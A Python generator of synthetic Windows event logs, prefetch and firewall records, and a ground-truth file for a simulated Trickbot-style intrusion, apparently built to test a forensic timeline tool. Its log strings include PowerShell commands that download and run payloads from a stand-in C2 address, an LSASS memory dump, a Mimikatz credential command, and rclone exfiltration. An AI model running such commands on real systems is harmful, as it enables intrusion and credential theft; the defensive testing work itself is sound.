#!/usr/bin/env python3
"""
generate_test_data.py — Synthetic Intrusion Dataset Generator
Creates a realistic Trickbot-style intrusion scenario across multiple log sources.

Scenario: Phishing → Macro → Stager → Credential Harvest → Lateral Movement → Persistence → Exfil

Generated files:
  Security.evtx.xml           — Logon/logoff, account events, process creation
  System.evtx.xml             — Service installation, system events
  Microsoft-Windows-PowerShell_Operational.evtx.xml
  Microsoft-Windows-TaskScheduler_Operational.evtx.xml
  Microsoft-Windows-TerminalServices-LocalSessionManager_Operational.evtx.xml
  Microsoft-Windows-TerminalServices-RemoteConnectionManager_Operational.evtx.xml
  prefetch.csv                — Prefetch execution evidence
  firewall.csv                — Windows Firewall connection log
  scenario_groundtruth.json   — Ground truth for validating tool output

Usage:
    python generate_test_data.py -o ./test_dataset/
"""

import os
import json
import csv
import argparse
import datetime

# ── SCENARIO TIMELINE ──────────────────────────────────────────────────────────
# All times in UTC. Victim machine: DESKTOP-W7K2MNX (10.10.1.55)
# Attacker C2: 185.220.101.45
# Lateral movement target: SRV-FILE01 (10.10.1.10)
# Domain: ACME.LOCAL

BASE = datetime.datetime(2024, 3, 15, 8, 0, 0)  # incident day start

def t(hours=0, minutes=0, seconds=0):
    return BASE + datetime.timedelta(hours=hours, minutes=minutes, seconds=seconds)

def ts(dt):
    return dt.strftime('%Y-%m-%dT%H:%M:%S.000000000Z')

def ts_pf(dt):
    return dt.strftime('%Y-%m-%d %H:%M:%S')

EVENT_ID_COUNTER = [1000]
def next_eid():
    EVENT_ID_COUNTER[0] += 1
    return EVENT_ID_COUNTER[0]

# ── XML EVENT BUILDER ──────────────────────────────────────────────────────────

def make_event(time_dt, event_id, level, channel, provider, computer, event_data, user_data=None):
    """Build a Windows Event Log XML event record."""
    eid = next_eid()
    lines = [
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">',
        '  <System>',
        f'    <Provider Name="{provider}"/>',
        f'    <EventID>{event_id}</EventID>',
        f'    <Level>{level}</Level>',
        f'    <TimeCreated SystemTime="{ts(time_dt)}"/>',
        f'    <EventRecordID>{eid}</EventRecordID>',
        f'    <Channel>{channel}</Channel>',
        f'    <Computer>{computer}</Computer>',
        '  </System>',
        '  <EventData>',
    ]
    import html as _html
    for k, v in event_data.items():
        lines.append(f'    <Data Name="{k}">{_html.escape(str(v))}</Data>')
    lines += ['  </EventData>', '</Event>']
    return '\n'.join(lines)

def write_evtx_xml(events, path):
    with open(path, 'w', encoding='utf-8') as f:
        f.write('<?xml version="1.0" encoding="UTF-8"?>\n')
        f.write('<Events>\n')
        for e in events:
            f.write(e)
            f.write('\n')
        f.write('</Events>\n')
    print(f'  [+] {os.path.basename(path)}  ({len(events)} events)')

# ── SCENARIO CONSTANTS ─────────────────────────────────────────────────────────

VICTIM_HOST   = 'DESKTOP-W7K2MNX'
VICTIM_IP     = '10.10.1.55'
VICTIM_USER   = 'jsmith'
VICTIM_DOMAIN = 'ACME'
VICTIM_SID    = 'S-1-5-21-3847294821-1073842346-2892847613-1104'

ATTACKER_IP   = '185.220.101.45'
LATERAL_HOST  = 'SRV-FILE01'
LATERAL_IP    = '10.10.1.10'
ADMIN_USER    = 'svc_backup'
ADMIN_SID     = 'S-1-5-21-3847294821-1073842346-2892847613-500'
DOMAIN        = 'ACME.LOCAL'
DC_IP         = '10.10.1.2'

def generate_security_events():
    events = []

    # ── 08:02 Normal morning logon (jsmith at workstation)
    events.append(make_event(t(8,2,11), 4624, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserSid': 'S-1-0-0',
            'TargetUserName': VICTIM_USER,
            'TargetDomainName': VICTIM_DOMAIN,
            'TargetUserSid': VICTIM_SID,
            'LogonType': '2',
            'IpAddress': '-',
            'IpPort': '-',
            'ProcessName': 'C:\\Windows\\System32\\winlogon.exe',
            'LogonProcessName': 'User32',
        }))

    # ── 08:47 Word opens invoice document (process creation)
    events.append(make_event(t(8,47,3), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
            'CommandLine': '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\jsmith\\Downloads\\Invoice_March2024.docm"',
            'ParentProcessName': 'C:\\Windows\\explorer.exe',
        }))

    # ── 08:47:45 Macro executes cmd.exe (suspicious parent)
    events.append(make_event(t(8,47,45), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Windows\\System32\\cmd.exe',
            'CommandLine': 'cmd.exe /c powershell.exe -nop -w hidden -EncodedCommand BASE64ENCODED',
            'ParentProcessName': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
        }))

    # ── 08:47:52 PowerShell launched by cmd (encoded command)
    events.append(make_event(t(8,47,52), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'CommandLine': 'powershell.exe -nop -w hidden -EncodedCommand BASE64ENCODED',
            'ParentProcessName': 'C:\\Windows\\System32\\cmd.exe',
        }))

    # ── 08:48:10 Stager drops payload to temp
    events.append(make_event(t(8,48,10), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe',
            'CommandLine': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe -install',
            'ParentProcessName': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        }))

    # ── 08:52 Credential harvesting — procdump against lsass
    events.append(make_event(t(8,52,4), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\pd.exe',
            'CommandLine': 'pd.exe -accepteula -ma lsass.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\lsass.dmp',
            'ParentProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe',
        }))

    # ── 08:52:30 lsass access (handle to sensitive process)
    events.append(make_event(t(8,52,30), 4656, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'ObjectName': '\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe',
            'ObjectType': 'Process',
            'AccessMask': '0x1410',
            'ProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\pd.exe',
        }))

    # ── 08:55 Domain recon — net and nltest
    for cmd, proc, offset in [
        ('net.exe group "Domain Admins" /domain', 'net.exe', 0),
        ('net.exe user /domain', 'net.exe', 8),
        ('nltest.exe /domain_trusts /all_trusts', 'nltest.exe', 18),
        ('nltest.exe /dclist:ACME.LOCAL', 'nltest.exe', 25),
    ]:
        events.append(make_event(t(8,55,offset), 4688, 0, 'Security',
            'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
                'SubjectUserName': VICTIM_USER,
                'SubjectDomainName': VICTIM_DOMAIN,
                'NewProcessName': f'C:\\Windows\\System32\\{proc}',
                'CommandLine': cmd,
                'ParentProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe',
            }))

    # ── 09:03 BloodHound / SharpHound collection
    events.append(make_event(t(9,3,12), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\SharpHound.exe',
            'CommandLine': 'SharpHound.exe -c All --domain ACME.LOCAL --zipfilename bloodhound_acme.zip',
            'ParentProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe',
        }))

    # ── 09:15 Explicit credential logon (RunAs with harvested creds)
    events.append(make_event(t(9,15,33), 4648, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'TargetUserName': ADMIN_USER,
            'TargetDomainName': VICTIM_DOMAIN,
            'TargetServerName': LATERAL_HOST,
            'ProcessName': 'C:\\Windows\\System32\\mstsc.exe',
        }))

    # ── 09:16 Network logon to file server (lateral movement)
    events.append(make_event(t(9,16,2), 4624, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserSid': 'S-1-0-0',
            'TargetUserName': ADMIN_USER,
            'TargetDomainName': VICTIM_DOMAIN,
            'TargetUserSid': ADMIN_SID,
            'LogonType': '3',
            'IpAddress': VICTIM_IP,
            'IpPort': '49823',
            'ProcessName': '-',
            'LogonProcessName': 'NtLmSsp',
            'WorkstationName': VICTIM_HOST,
        }))

    # ── 09:22 Scheduled task creation for persistence
    events.append(make_event(t(9,22,5), 4698, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'TaskName': '\\Microsoft\\Windows\\UpdateCheck\\WinUpdateSvc',
            'TaskContent': '<?xml version="1.0"?><Task><Actions><Exec><Command>C:\\Users\\jsmith\\AppData\\Roaming\\WinUpdateSvc.exe</Command></Exec></Actions></Task>',
        }))

    # ── 09:35 Staging — robocopy to collect files
    events.append(make_event(t(9,35,18), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Windows\\System32\\robocopy.exe',
            'CommandLine': 'robocopy.exe \\\\SRV-FILE01\\Finance C:\\Users\\jsmith\\AppData\\Local\\Temp\\staging /E /COPYALL',
            'ParentProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe',
        }))

    # ── 09:41 Rclone exfiltration attempt
    events.append(make_event(t(9,41,7), 4688, 0, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': VICTIM_USER,
            'SubjectDomainName': VICTIM_DOMAIN,
            'NewProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\rclone.exe',
            'CommandLine': 'rclone.exe copy C:\\Users\\jsmith\\AppData\\Local\\Temp\\staging remote:acme-backup --config C:\\Users\\jsmith\\AppData\\Local\\Temp\\rclone.conf',
            'ParentProcessName': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe',
        }))

    # ── 09:45 Logon failure (possibly scanning adjacent hosts)
    for i, ip in enumerate(['10.10.1.20','10.10.1.21','10.10.1.22','10.10.1.23']):
        events.append(make_event(t(9,45,i*3), 4625, 0, 'Security',
            'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
                'TargetUserName': 'Administrator',
                'TargetDomainName': '.',
                'FailureReason': '%%2313',
                'Status': '0xC000006D',
                'SubStatus': '0xC0000064',
                'IpAddress': ip,
                'LogonType': '3',
            }))

    # ── 10:02 Defender detection / quarantine attempt
    events.append(make_event(t(10,2,44), 1116, 3, 'Security',
        'Microsoft-Windows-Security-Auditing', VICTIM_HOST, {
            'SubjectUserName': 'SYSTEM',
            'SubjectDomainName': 'NT AUTHORITY',
            'NewProcessName': 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2302.7-0\\MsMpEng.exe',
            'CommandLine': '',
            'ParentProcessName': '',
        }))

    return events


def generate_system_events():
    events = []

    # ── 08:48:15 Malicious service installed
    events.append(make_event(t(8,48,15), 7045, 2, 'System',
        'Service Control Manager', VICTIM_HOST, {
            'ServiceName': 'WinUpdateHelper',
            'ImagePath': 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe -service',
            'ServiceType': 'user mode service',
            'StartType': 'auto start',
            'AccountName': 'LocalSystem',
        }))

    # ── 09:22:10 Scheduled task service notification
    events.append(make_event(t(9,22,10), 7040, 4, 'System',
        'Service Control Manager', VICTIM_HOST, {
            'param1': 'Task Scheduler',
            'param2': 'auto start',
            'param3': 'demand start',
        }))

    return events


def generate_powershell_events():
    events = []

    # ── 08:47:52 Encoded command execution (script block)
    events.append(make_event(t(8,47,55), 4104, 3, 'Microsoft-Windows-PowerShell/Operational',
        'Microsoft-Windows-PowerShell', VICTIM_HOST, {
            'MessageNumber': '1',
            'MessageTotal': '1',
            'ScriptBlockText': 'iex (New-Object Net.WebClient).DownloadString("http://185.220.101.45/stager.ps1")',
            'ScriptBlockId': 'a3f9e2b1-c4d5-6789-abcd-ef0123456789',
            'Path': '',
        }))

    # ── 08:48:02 Downloaded stager content executed
    events.append(make_event(t(8,48,2), 4104, 3, 'Microsoft-Windows-PowerShell/Operational',
        'Microsoft-Windows-PowerShell', VICTIM_HOST, {
            'MessageNumber': '1',
            'MessageTotal': '1',
            'ScriptBlockText': '$url="http://185.220.101.45/payload.exe"; $out="$env:TEMP\\svchost32.exe"; (New-Object Net.WebClient).DownloadFile($url,$out); Start-Process $out -ArgumentList "-install"',
            'ScriptBlockId': 'b5e8f3c2-d7a1-4823-bcde-f1234567890a',
            'Path': '',
        }))

    # ── 09:03:05 SharpHound execution via PS
    events.append(make_event(t(9,3,5), 4104, 3, 'Microsoft-Windows-PowerShell/Operational',
        'Microsoft-Windows-PowerShell', VICTIM_HOST, {
            'MessageNumber': '1',
            'MessageTotal': '1',
            'ScriptBlockText': 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://185.220.101.45/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All',
            'ScriptBlockId': 'c6f9a4d3-e8b2-5934-cdef-012345678901',
            'Path': '',
        }))

    # ── 09:20:11 Credential extraction attempt via PS
    events.append(make_event(t(9,20,11), 4104, 3, 'Microsoft-Windows-PowerShell/Operational',
        'Microsoft-Windows-PowerShell', VICTIM_HOST, {
            'MessageNumber': '1',
            'MessageTotal': '1',
            'ScriptBlockText': 'sekurlsa::logonpasswords',
            'ScriptBlockId': 'd7a0b5e4-f9c3-6045-def0-123456789012',
            'Path': '',
        }))

    return events


def generate_task_scheduler_events():
    events = []

    # ── 09:22:05 Task registered
    events.append(make_event(t(9,22,5), 106, 4, 'Microsoft-Windows-TaskScheduler/Operational',
        'Microsoft-Windows-TaskScheduler', VICTIM_HOST, {
            'TaskName': '\\Microsoft\\Windows\\UpdateCheck\\WinUpdateSvc',
            'UserName': f'{VICTIM_DOMAIN}\\{VICTIM_USER}',
        }))

    # ── 09:22:07 Task enabled
    events.append(make_event(t(9,22,7), 141, 4, 'Microsoft-Windows-TaskScheduler/Operational',
        'Microsoft-Windows-TaskScheduler', VICTIM_HOST, {
            'TaskName': '\\Microsoft\\Windows\\UpdateCheck\\WinUpdateSvc',
            'UserName': f'{VICTIM_DOMAIN}\\{VICTIM_USER}',
        }))

    # ── 09:22:30 Task first execution
    events.append(make_event(t(9,22,30), 200, 4, 'Microsoft-Windows-TaskScheduler/Operational',
        'Microsoft-Windows-TaskScheduler', VICTIM_HOST, {
            'TaskName': '\\Microsoft\\Windows\\UpdateCheck\\WinUpdateSvc',
            'ActionName': 'C:\\Users\\jsmith\\AppData\\Roaming\\WinUpdateSvc.exe',
            'ResultCode': '0',
            'UserName': f'{VICTIM_DOMAIN}\\{VICTIM_USER}',
        }))

    return events


def generate_rdp_local_session_events():
    events = []

    # ── 09:16:05 RDP session logon to lateral target
    events.append(make_event(t(9,16,5), 21, 4,
        'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',
        'Microsoft-Windows-TerminalServices-LocalSessionManager', LATERAL_HOST, {
            'User': f'{VICTIM_DOMAIN}\\{ADMIN_USER}',
            'SessionID': '2',
            'Address': VICTIM_IP,
        }))

    # ── 09:16:07 Shell started on lateral target
    events.append(make_event(t(9,16,7), 22, 4,
        'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',
        'Microsoft-Windows-TerminalServices-LocalSessionManager', LATERAL_HOST, {
            'User': f'{VICTIM_DOMAIN}\\{ADMIN_USER}',
            'SessionID': '2',
            'Address': VICTIM_IP,
        }))

    # ── 09:58:22 RDP session logoff
    events.append(make_event(t(9,58,22), 23, 4,
        'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',
        'Microsoft-Windows-TerminalServices-LocalSessionManager', LATERAL_HOST, {
            'User': f'{VICTIM_DOMAIN}\\{ADMIN_USER}',
            'SessionID': '2',
            'Address': VICTIM_IP,
        }))

    return events


def generate_rdp_remote_conn_events():
    events = []

    events.append(make_event(t(9,16,3), 1149, 4,
        'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational',
        'Microsoft-Windows-TerminalServices-RemoteConnectionManager', LATERAL_HOST, {
            'Param1': f'{VICTIM_DOMAIN}\\{ADMIN_USER}',
            'Param2': '',
            'Param3': VICTIM_IP,
        }))

    return events


def generate_prefetch_csv(output_dir):
    rows = [
        ['LastRun', 'RunCount', 'ExecutableName', 'FullPath', 'SHA1'],
        [ts_pf(t(8,47,3)),  '12', 'WINWORD.EXE',
         'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', 'da39a3ee5e6b4b0d3255bfef95601890afd80709'],
        [ts_pf(t(8,47,52)), '1',  'POWERSHELL.EXE',
         'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'adc83b19e793491b1c6ea0fd8b46cd9f32e592fc'],
        [ts_pf(t(8,48,10)), '1',  'SVCHOST32.EXE',
         'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe', 'b6d767d2f8ed5d21a44b0e5886680cb9'],
        [ts_pf(t(8,52,4)),  '1',  'PD.EXE',
         'C:\\Users\\jsmith\\AppData\\Local\\Temp\\pd.exe', '5d41402abc4b2a76b9719d911017c592'],
        [ts_pf(t(8,55,0)),  '3',  'NET.EXE',
         'C:\\Windows\\System32\\net.exe', 'adc83b19e793491b1c6ea0fd8b46cd9f32e592fc'],
        [ts_pf(t(8,55,18)), '2',  'NLTEST.EXE',
         'C:\\Windows\\System32\\nltest.exe', 'adc83b19e793491b1c6ea0fd8b46cd9f32e592fc'],
        [ts_pf(t(9,3,12)),  '1',  'SHARPHOUND.EXE',
         'C:\\Users\\jsmith\\AppData\\Local\\Temp\\SharpHound.exe', 'c4ca4238a0b923820dcc509a6f75849b'],
        [ts_pf(t(9,15,33)), '1',  'MSTSC.EXE',
         'C:\\Windows\\System32\\mstsc.exe', 'adc83b19e793491b1c6ea0fd8b46cd9f32e592fc'],
        [ts_pf(t(9,22,30)), '2',  'WINUPDATESVC.EXE',
         'C:\\Users\\jsmith\\AppData\\Roaming\\WinUpdateSvc.exe', 'eccbc87e4b5ce2fe28308fd9f2a7baf3'],
        [ts_pf(t(9,35,18)), '1',  'ROBOCOPY.EXE',
         'C:\\Windows\\System32\\robocopy.exe', 'adc83b19e793491b1c6ea0fd8b46cd9f32e592fc'],
        [ts_pf(t(9,41,7)),  '1',  'RCLONE.EXE',
         'C:\\Users\\jsmith\\AppData\\Local\\Temp\\rclone.exe', '1679091c5a880faf6fb5e6087eb1b2dc'],
    ]
    path = os.path.join(output_dir, 'prefetch.csv')
    with open(path, 'w', newline='') as f:
        csv.writer(f).writerows(rows)
    print(f'  [+] prefetch.csv  ({len(rows)-1} entries)')


def generate_firewall_csv(output_dir):
    rows = [['date','time','action','protocol','src-ip','src-port','dst-ip','dst-port','size','direction','path']]

    # C2 initial download
    rows.append([t(8,47,58).strftime('%Y-%m-%d'), t(8,47,58).strftime('%H:%M:%S'),
        'ALLOW','TCP', VICTIM_IP,'49312', ATTACKER_IP,'80','1024','SEND',
        'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'])

    rows.append([t(8,48,1).strftime('%Y-%m-%d'), t(8,48,1).strftime('%H:%M:%S'),
        'ALLOW','TCP', VICTIM_IP,'49313', ATTACKER_IP,'80','524288','RECEIVE',
        'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'])

    # C2 beacon (periodic)
    for i in range(8):
        beacon_t = t(8,48,30) + datetime.timedelta(minutes=i*5)
        rows.append([beacon_t.strftime('%Y-%m-%d'), beacon_t.strftime('%H:%M:%S'),
            'ALLOW','TCP', VICTIM_IP, str(49400+i), ATTACKER_IP,'443','128','SEND',
            'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe'])
        rows.append([beacon_t.strftime('%Y-%m-%d'), (beacon_t + datetime.timedelta(seconds=1)).strftime('%H:%M:%S'),
            'ALLOW','TCP', VICTIM_IP, str(49400+i), ATTACKER_IP,'443','256','RECEIVE',
            'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.exe'])

    # Lateral movement RDP
    rows.append([t(9,15,50).strftime('%Y-%m-%d'), t(9,15,50).strftime('%H:%M:%S'),
        'ALLOW','TCP', VICTIM_IP,'49823', LATERAL_IP,'3389','2048','SEND',
        'C:\\Windows\\System32\\mstsc.exe'])

    # Exfil via rclone (large outbound)
    for i in range(6):
        exfil_t = t(9,41,10) + datetime.timedelta(minutes=i*2)
        rows.append([exfil_t.strftime('%Y-%m-%d'), exfil_t.strftime('%H:%M:%S'),
            'ALLOW','TCP', VICTIM_IP, str(50000+i), ATTACKER_IP,'443',
            str(10*1024*1024),'SEND',
            'C:\\Users\\jsmith\\AppData\\Local\\Temp\\rclone.exe'])

    path = os.path.join(output_dir, 'firewall.csv')
    with open(path, 'w', newline='') as f:
        csv.writer(f).writerows(rows)
    print(f'  [+] firewall.csv  ({len(rows)-1} entries)')


def generate_ground_truth(output_dir):
    truth = {
        "scenario": "Trickbot-style targeted intrusion",
        "victim_host": VICTIM_HOST,
        "victim_user": VICTIM_USER,
        "attacker_c2": ATTACKER_IP,
        "lateral_target": LATERAL_HOST,
        "phases": [
            {
                "phase": "Initial Access",
                "time": ts_pf(t(8,47,3)),
                "description": "Phishing document Invoice_March2024.docm opened in Word",
                "indicators": ["WINWORD.EXE opening .docm", "cmd.exe spawned by Word"]
            },
            {
                "phase": "Execution",
                "time": ts_pf(t(8,47,52)),
                "description": "Macro executed encoded PowerShell to download stager from 185.220.101.45",
                "indicators": ["EncodedCommand PowerShell", "DownloadString from C2", "svchost32.exe dropped to Temp"]
            },
            {
                "phase": "Persistence",
                "time": ts_pf(t(8,48,15)),
                "description": "Malicious service WinUpdateHelper installed, scheduled task WinUpdateSvc created",
                "indicators": ["Event 7045 new service", "Event 4698 scheduled task", "WinUpdateSvc.exe in Roaming"]
            },
            {
                "phase": "Credential Access",
                "time": ts_pf(t(8,52,4)),
                "description": "LSASS memory dumped via pd.exe (procdump), sekurlsa attempted via PowerShell",
                "indicators": ["pd.exe -ma lsass.exe", "Event 4656 lsass handle", "sekurlsa::logonpasswords in PS log"]
            },
            {
                "phase": "Discovery",
                "time": ts_pf(t(8,55,0)),
                "description": "Domain recon via net.exe and nltest.exe, BloodHound collection via SharpHound",
                "indicators": ["net group Domain Admins", "nltest /dclist", "SharpHound.exe -c All"]
            },
            {
                "phase": "Lateral Movement",
                "time": ts_pf(t(9,15,33)),
                "description": "RDP to SRV-FILE01 using harvested svc_backup credentials",
                "indicators": ["Event 4648 explicit credentials", "Event 4624 Type 3 from victim IP", "RDP session events on SRV-FILE01"]
            },
            {
                "phase": "Collection",
                "time": ts_pf(t(9,35,18)),
                "description": "Robocopy staging of Finance share contents to local Temp directory",
                "indicators": ["robocopy \\\\SRV-FILE01\\Finance", "large volume of file creation in Temp"]
            },
            {
                "phase": "Exfiltration",
                "time": ts_pf(t(9,41,7)),
                "description": "Rclone used to exfiltrate staged files to attacker-controlled cloud storage over HTTPS",
                "indicators": ["rclone.exe copy", "~60MB outbound to 185.220.101.45:443", "rclone.conf in Temp"]
            }
        ]
    }
    path = os.path.join(output_dir, 'scenario_groundtruth.json')
    with open(path, 'w') as f:
        json.dump(truth, f, indent=2)
    print(f'  [+] scenario_groundtruth.json')


def main():
    ap = argparse.ArgumentParser(description='Generate synthetic intrusion test dataset')
    ap.add_argument('-o','--output', required=True, help='Output directory')
    args = ap.parse_args()

    os.makedirs(args.output, exist_ok=True)
    print(f'[*] Generating synthetic intrusion dataset → {args.output}')
    print(f'[*] Scenario: Trickbot-style — phishing → stager → creds → lateral → exfil')
    print()

    write_evtx_xml(generate_security_events(),
        os.path.join(args.output, 'Security.evtx.xml'))
    write_evtx_xml(generate_system_events(),
        os.path.join(args.output, 'System.evtx.xml'))
    write_evtx_xml(generate_powershell_events(),
        os.path.join(args.output, 'Microsoft-Windows-PowerShell_Operational.evtx.xml'))
    write_evtx_xml(generate_task_scheduler_events(),
        os.path.join(args.output, 'Microsoft-Windows-TaskScheduler_Operational.evtx.xml'))
    write_evtx_xml(generate_rdp_local_session_events(),
        os.path.join(args.output, 'Microsoft-Windows-TerminalServices-LocalSessionManager_Operational.evtx.xml'))
    write_evtx_xml(generate_rdp_remote_conn_events(),
        os.path.join(args.output, 'Microsoft-Windows-TerminalServices-RemoteConnectionManager_Operational.evtx.xml'))
    generate_prefetch_csv(args.output)
    generate_firewall_csv(args.output)
    generate_ground_truth(args.output)

    print()
    print('[*] Dataset ready. Feed to attack_timeline.py:')
    print(f'    python attack_timeline.py -i {args.output} -o ./timeline_results/')


if __name__ == '__main__':
    main()
